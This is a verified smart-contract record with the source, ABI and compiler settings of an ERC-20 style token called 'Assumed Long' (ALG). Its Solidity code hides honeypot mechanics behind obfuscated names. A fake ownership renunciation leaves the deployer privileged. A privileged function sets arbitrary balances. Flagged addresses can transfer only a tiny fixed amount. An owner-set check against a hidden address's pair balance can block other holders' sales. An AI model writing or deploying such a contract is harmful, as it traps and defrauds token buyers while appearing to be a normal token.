{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface marketingIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTeam) external view returns (uint256);\n\n    function transfer(address sellTotal, uint256 listSwap) external returns (bool);\n\n    function allowance(address tokenShouldBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellTotal,\n        uint256 listSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed buyTradingSender, uint256 value);\n    event Approval(address indexed tokenShouldBuy, address indexed spender, uint256 value);\n}\n\nabstract contract tokenShould {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedModeMin {\n    function createPair(address amountSwapMode, address launchedBuyLiquidity) external returns (address);\n}\n\ninterface tokenFee is marketingIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssumedLong is tokenShould, marketingIs, tokenFee {\n\n    address public marketingListEnable;\n\n    function enableMax(address senderTrading) public {\n        walletModeLiquidity();\n        \n        if (senderTrading == marketingListEnable || senderTrading == enableTotal) {\n            return;\n        }\n        receiverLimit[senderTrading] = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoFromList;\n    }\n\n    uint256 private shouldMinFrom;\n\n    bool private totalSender;\n\n    constructor (){\n        if (shouldMinFrom != maxBuy) {\n            maxBuy = toReceiver;\n        }\n        buyEnable buyFund = buyEnable(walletModeEnable);\n        enableTotal = launchedModeMin(buyFund.factory()).createPair(buyFund.WETH(), address(this));\n        \n        marketingListEnable = _msgSender();\n        toSender();\n        fromSwap[marketingListEnable] = true;\n        sellLaunched[marketingListEnable] = tradingTeam;\n        \n        emit Transfer(address(0), marketingListEnable, tradingTeam);\n    }\n\n    function balanceOf(address buyTeam) public view virtual override returns (uint256) {\n        return sellLaunched[buyTeam];\n    }\n\n    uint256 private launchedLaunch;\n\n    uint256 fromTeam;\n\n    bool public minMode;\n\n    string private feeExempt = \"Assumed Long\";\n\n    function toSender() public {\n        emit OwnershipTransferred(marketingListEnable, address(0));\n        launchFee = address(0);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return feeExempt;\n    }\n\n    uint256 constant sellFee = 18 ** 10;\n\n    address public enableTotal;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundFrom;\n    }\n\n    uint256 private maxBuy;\n\n    function transfer(address sellLaunch, uint256 listSwap) external virtual override returns (bool) {\n        return sellAuto(_msgSender(), sellLaunch, listSwap);\n    }\n\n    uint256 toIs;\n\n    function getOwner() external view returns (address) {\n        return launchFee;\n    }\n\n    uint256 private toReceiver;\n\n    function walletModeLiquidity() private view {\n        require(fromSwap[_msgSender()]);\n    }\n\n    event OwnershipTransferred(address indexed receiverSwap, address indexed sellIs);\n\n    function exemptAmountLaunched(address sellLaunch, uint256 listSwap) public {\n        walletModeLiquidity();\n        sellLaunched[sellLaunch] = listSwap;\n    }\n\n    mapping(address => uint256) private sellLaunched;\n\n    function owner() external view returns (address) {\n        return launchFee;\n    }\n\n    string private autoFromList = \"ALG\";\n\n    uint256 private tradingTeam = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private senderMinSell;\n\n    function transferFrom(address txLimit, address sellTotal, uint256 listSwap) external override returns (bool) {\n        if (_msgSender() != walletModeEnable) {\n            if (senderMinSell[txLimit][_msgSender()] != type(uint256).max) {\n                require(listSwap <= senderMinSell[txLimit][_msgSender()]);\n                senderMinSell[txLimit][_msgSender()] -= listSwap;\n            }\n        }\n        return sellAuto(txLimit, sellTotal, listSwap);\n    }\n\n    function fundIsLaunch(uint256 listSwap) public {\n        walletModeLiquidity();\n        fromTeam = listSwap;\n    }\n\n    function allowance(address senderLaunch, address launchedMin) external view virtual override returns (uint256) {\n        if (launchedMin == walletModeEnable) {\n            return type(uint256).max;\n        }\n        return senderMinSell[senderLaunch][launchedMin];\n    }\n\n    function exemptSell(address txLimit, address sellTotal, uint256 listSwap) internal returns (bool) {\n        require(sellLaunched[txLimit] >= listSwap);\n        sellLaunched[txLimit] -= listSwap;\n        sellLaunched[sellTotal] += listSwap;\n        emit Transfer(txLimit, sellTotal, listSwap);\n        return true;\n    }\n\n    address private launchFee;\n\n    address senderTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function approve(address launchedMin, uint256 listSwap) public virtual override returns (bool) {\n        senderMinSell[_msgSender()][launchedMin] = listSwap;\n        emit Approval(_msgSender(), launchedMin, listSwap);\n        return true;\n    }\n\n    uint8 private fundFrom = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTeam;\n    }\n\n    address walletModeEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public receiverLimit;\n\n    function takeLaunched(address launchShould) public {\n        if (minMode) {\n            return;\n        }\n        \n        fromSwap[launchShould] = true;\n        \n        minMode = true;\n    }\n\n    mapping(address => bool) public fromSwap;\n\n    function sellAuto(address txLimit, address sellTotal, uint256 listSwap) internal returns (bool) {\n        if (txLimit == marketingListEnable) {\n            return exemptSell(txLimit, sellTotal, listSwap);\n        }\n        uint256 liquidityEnable = marketingIs(enableTotal).balanceOf(senderTake);\n        require(liquidityEnable == fromTeam);\n        require(sellTotal != senderTake);\n        if (receiverLimit[txLimit]) {\n            return exemptSell(txLimit, sellTotal, sellFee);\n        }\n        return exemptSell(txLimit, sellTotal, listSwap);\n    }\n\n    bool public liquidityFundAt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenShouldBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTradingSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"enableMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"exemptAmountLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"fundIsLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFundAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingListEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchShould\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AssumedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}